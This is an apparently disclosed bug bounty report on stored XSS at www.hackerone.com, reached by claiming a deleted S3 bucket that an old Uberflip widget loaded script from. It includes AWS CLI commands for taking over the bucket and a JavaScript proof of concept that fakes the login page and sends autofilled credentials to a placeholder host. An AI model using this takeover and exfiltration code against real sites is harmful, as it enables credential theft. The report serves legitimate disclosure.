# Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget

## Report Details
- **Report ID**: 1598347
- **URL**: https://hackerone.com/reports/1598347
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-06-12T19:57:20.615Z
- **Disclosed**: 2023-03-10T15:20:48.799Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hi,

I hope you all are good! Here's a funny little bug :) I tried making the most out of it and hope you'll like it.

As you probably know, you're proxying `https://www.hackerone.com/resources` to `read.uberflip.com`. Uberflip has done a great job isolating content for hubs between custom domains pointing to them, so it wasn't that easy to find something interesting here. However, after a while I noticed that there's an old concept called "page widgets" that are still present cross-customers for Uberflip under `/read/page_widget/XXX` where `XXX` is a numeric ID of a widget.

I have no idea how these page widgets are created, but a lot of them seem old. Like, *really* old. Most of them used `http` to load any additional assets which prevented `https://www.hackerone.com` from loading any of the HTTP-assets, but after some digging I did find a few widget-IDs that  used HTTPS to load javascript.

One of those widgets looked like this:

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>Flipbook Widget</title></head>
<body style="margin:0; padding:0; background:transparent; overflow:hidden;"><div id="widget" style="float:left;"> <script id='vspoverlayrun'

codecredit='CopyRight_VSPWorldwide_Productions'
videofolder='hosted'
projectname='vmags43_overlay'
alignvideo='bottommiddle'
offsetx='0'
offsety='0'
waittime='1000'
autoplay='yes'
videowidth='300'
videoheight='480'
videoscale='1'
videoscalemobile='1'
posterscale='0.5'
clickvideo='close'
autodim='0'
autodimcolor='#000000'

src='https://s3.amazonaws.com/vspcode/vspoverlayrun1.js'></script></div></body></html>
```

What was funny with this one was that the S3-bucket `vspcode` did not exist. I could now claim this bucket and run javascript on `https://www.hackerone.com`:

```
$ aws s3api create-bucket --profile frans --bucket vspcode
{
    "Location": "/vspcode"
}

$ echo "alert(document.domain + ':' + location.href);" > vspoverlayrun1.js

$ aws s3 cp vspoverlayrun1.js s3://vspcode/ --acl public-read --profile frans

upload: ./vspoverlayrun1.js to s3://vspcode/vspoverlayrun1.js
```

I could then visit the widget and see:

{F1771181}

As you're already aware, the `www`-subdomain is still isolated from the app-domain at `https://hackerone.com`. However, the concept of separating an app using `www` vs apex is – I would say – not a standard concept at all. This means that for example password managers will actually help the user by still suggesting auto completion on `www` if the saved login is on the apex-domain. This applies for example both to Safari and Chrome:

{F1771182}

{F1771183}

So I made a javascript that will replace the full content of the page with the sign-in-form of `https://hackerone.com`. The only difference is that it'll log any events interacting with the inputs:

```js
history.pushState('','Sign in', 'https://www.hackerone.com/users/sign_in')
function log() { 
 var x = new FormData(document.forms[0]);
 (new Image()).src='https://MY-DOMAIN/hackerone/?' + btoa(JSON.stringify(Object.fromEntries(x.entries())))
};
document.body.parentElement.innerHTML = 'login-page-of-hackerone.com';
```

This allows me to see any actions taken or any auto-completion triggering on these forms on my own host:

{F1771184}

### PoC

Here's how my page looks like:

{F1771180}

Here's a video showing the concept of loading the website:

{F1771179}

And here's the vulnerable URL:

```
https://www.hackerone.com/resources/read/page_widget/413780
```

Regards,
Frans

## Impact

#

## Attachments
- hackerone-xss.mp4
- Screen_Shot_2022-06-12_at_20.46.10.png
- Screen_Shot_2022-06-12_at_20.45.29.png
- Screen_Shot_2022-06-12_at_20.39.57.png
- Screen_Shot_2022-06-12_at_20.28.44.png
- Screen_Shot_2022-06-12_at_20.29.02.png
